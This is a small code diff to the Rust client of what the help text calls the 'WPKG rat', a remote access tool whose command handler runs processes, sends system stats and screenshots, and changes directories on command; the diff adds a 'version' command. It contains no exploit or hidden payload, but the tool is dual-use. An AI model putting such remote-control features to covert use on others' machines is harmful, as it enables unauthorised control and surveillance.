@@ -8,6 +8,7 @@ use tracing::{debug, error, info};
 
 use crate::unwrap::CustomUnwrap;
 use crate::utils;
+use crate::globals;
 
 #[async_recursion(?Send)]
 pub async fn connect(addr: String) {
@@ -202,12 +203,14 @@ impl Client {
                     self.close()?;
                 }
 
-                "ping" => self.send("Ping received")?,
+                "ping" => self.send("ping-received")?,
+
+                "version" => self.send(&format!("{}",globals::CURRENT_VERSION))?,
 
                 // send help message
                 "help" => {
                     let help = format!(
-                        "{}{}{}{}{}{}{}{}{}{}{}{}{}{}",
+                        "{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}",
                         "msg <message> - showing message\n",
                         "stat - sending pc stats (CPU, RAM and Swap)\n",
                         "run <process> <args> - run process\n",
@@ -215,6 +218,7 @@ impl Client {
                         "screenshot - make screenshot and sending url\n",
                         "disconnect - disconnecting ServerD Client\n",
                         "ping - sending ping\n",
+                        "version - get version of WPKG rat\n",
                         "help - showing help\n",
                         "cd <dir> - changing dir",
                         "pwd - showing directory\n",
